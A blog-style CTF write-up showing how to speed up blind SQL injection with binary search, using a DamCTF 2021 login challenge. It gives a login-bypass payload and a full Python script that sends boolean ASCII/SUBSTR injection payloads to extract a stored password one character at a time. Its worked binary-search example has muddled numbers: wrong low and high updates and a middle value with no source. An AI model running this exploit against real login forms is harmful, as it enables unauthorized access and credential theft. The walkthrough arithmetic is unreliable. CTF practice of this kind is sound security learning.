---
layout: post
title: Implementing Binary Search Algorithm in Blind SQL Injection
tags: [sqli]
published: true
---
## Summury


# Blind Sql injection (T)heoretical 
To exfiltrate data from database using blind SQL injection we need to bruteforce character by character
That's requires alot of bruteforce you'll bruteforce {a-z|A-Z|0-9} to exfiltrate one character
Now We reduced the requests to 4~7 request per character 
We'll insert the alphabet in array as ASCII numbers then Divide by 2 until you get the correct character

## How is the binary search algorithm works?
Let us assume that we need to search value 91 using binary search.

![BinarySearch1](/assets/img/Binaryserach1.png){: .mx-auto.d-block :}

First, we should select the half of the array by using this way

~~~
middle = low + (high - low) / 2
~~~

13 + (146 - 13) / 2 = 79 (integer of 79.5). So, 79 is the middle.

The Red square is the middle.

![BinarySearchmiddle](/assets/img/BinarysearchMiddle.png){: .mx-auto.d-block :}

Now we should compare the middle(79) with the target value(91)

The target value is greater than 79.

So our target value in the second half of the array We will ignore the first half

![BinarySearch3](/assets/img/BinarySearch3.png){: .mx-auto.d-block :}

We will change our low to middle + 1 and find the new middle

~~~
low = middle + 1
middle = low + (high - low) / 2
~~~
low = 80 + 1
middle = low + ( 146 - low ) / 2 = 113

Our new middle is 113, We now comparing the new middle(113) with our target(91)

![BinarySearch4](/assets/img/BinarySearch4.png){: .mx-auto.d-block :}

The middle(113) is greater than target(91), So we will take first half

![BinarySearch5](/assets/img/BinarySearch5.png){: .mx-auto.d-block :}

We calculate the middle again
high = 91 - 1
middle = 84 + ( 90 - 84 ) / 2 = 87
Compare the target(91) again with middle(87)
Now the middle(87) less than the target we will take the second half

![BinarySearch6](/assets/img/BinarySearch6.png){: .mx-auto.d-block :}

This how binary search algorthim works and found the target value.

## How we can use Bianry Search in Blind SQL Injection?

I'll use [bouncy-box](https://ctftime.org/task/17933) challange from [DamCTF-2021](https://ctftime.org/event/1401).

I'm facing a normal login panel with SQL injection vulnerability in the username field.

![Chall1](/assets/img/Chall1.png){: .mx-auto.d-block :}

Bypass the login panel with the common true condition `' and 1=1;`

![Chall2](/assets/img/Chall2.png){: .mx-auto.d-block :}

So we now bypassed the login but when I'm request the free flag

![Chall3](/assets/img/Chall3.png){: .mx-auto.d-block :}

I'm facing the same login panel but this time they patched the SQL injection.

![Chall4](/assets/img/Chall4.png){: .mx-auto.d-block :}

So I should dump the password from the previous login panel.
Let's back to the previous login panel and script the process.

#### What I will do?

Basically I'll use [ASCII](https://www.w3schools.com/sql/func_sqlserver_ascii.asp) function in SQL && The ASCII Values for the printables characters which is from 32 to 128

So let's create new Python script with 2 functions
The first function(sqli) Responsible for communicating with the server to send payloads

```py
import requests #importing requests library
host="https://bouncy-box.chals.damctf.xyz/login" #challange server

def sqli():
    data = {
        "username":"payload",
        "password":"a",
        "score":0
    }
    r = requests.post(host, json=data)
    print(data, r.text)    
    
```
So now we will write the algorithm in get_char function.

```py
def get_char(pos):
    lo, hi = 32, 128 # the ASCII values for printables
    while lo <= hi: #calculating the first mid
        mid = lo + (hi - lo) // 2 # the formula i've explanied before
        if sqli(pos, mid): 
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)
```
In the last step, I must loop all characters, send the character and write the payload.
The final script:
```py
import requests
host="https://bouncy-box.chals.damctf.xyz/login"

def sqli(pos,mid):
    data = {
        "username":"boxy_mcbounce' AND ascii(substr(password,%i,1))>%i -- -" % (pos,mid),
        "password":"a",
        "score":0
    }
    r = requests.post(host, json=data)
    print(data, r.text)
    return "Logging you" in r.text

def get_char(pos):
    lo, hi = 32, 128
    while lo <= hi:
        mid = lo + (hi - lo) // 2
        if sqli(pos, mid):
            lo = mid + 1
        else:
            hi = mid - 1
    return chr(lo)

flag = ''
for i in range(1, 15):
    flag += get_char(i)
    print(flag)
```
#### Final Result

![Challfinal](/assets/img/Challfinal.png){: .mx-auto.d-block :}

We have optimized the SQL injection process in time and resources

We extract 12 character from the database in 1 min with just 84 request.

![Challfinal2](/assets/img/Challfinal2.png){: .mx-auto.d-block :}

Thanks for reading.
